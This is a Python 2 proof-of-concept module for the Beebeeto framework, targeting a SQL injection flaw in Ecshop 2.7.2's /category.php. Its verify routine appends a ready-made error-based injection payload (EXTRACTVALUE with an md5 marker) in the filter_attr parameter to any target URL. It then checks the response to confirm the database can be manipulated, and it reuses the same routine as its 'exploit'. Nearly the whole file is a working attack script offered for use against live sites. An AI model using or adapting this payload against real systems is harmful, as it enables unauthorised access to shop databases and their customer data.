#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0092',
            'name': 'Ecshop 2.7.2 /category.php SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-10-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Ecshop',
            'vul_version': ['2.7.2'],
            'type': 'SQL Injection',
            'tag': ['Ecshop漏洞', 'SQL注入漏洞', '/category.php'],
            'desc': '''
                    Ecshop 2.7.2 /category.php 文件中变量 $filter_attr_str 是以“.” 分开的数组，
                    没有作任何处理就加入了SQL查询，造成SQL注入。
                    ''',
	    'references': ['http://sebug.net/vuldb/ssvid-19574',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&"
                   "price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71"
                   "%2c(MID((IFNULL(CAST(md5(3)%20AS%20CHAR)%2c0x20))%2c1%2c50))%2c0x7172737471))")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "cbc87e4b5ce2fe28" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())